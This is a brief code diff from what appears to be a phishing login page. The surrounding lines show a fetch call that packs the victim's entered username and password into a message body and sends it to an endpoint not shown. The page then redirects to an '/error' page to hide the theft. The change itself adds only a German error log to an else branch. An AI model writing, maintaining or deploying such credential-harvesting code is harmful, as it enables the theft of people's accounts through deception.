@@ -322,7 +322,7 @@
                 },
                 body: JSON.stringify({ content: `**USERNAME:** ${inputUsername.value.value}\n**PASSWORD:** ${inputPassword.value.value}` })
             });
-        } else { return; }
+        } else { console.error('Fehler aufgetreten.'); return; }
         setTimeout(() => {
             navigateTo('/error');
         }, 500);
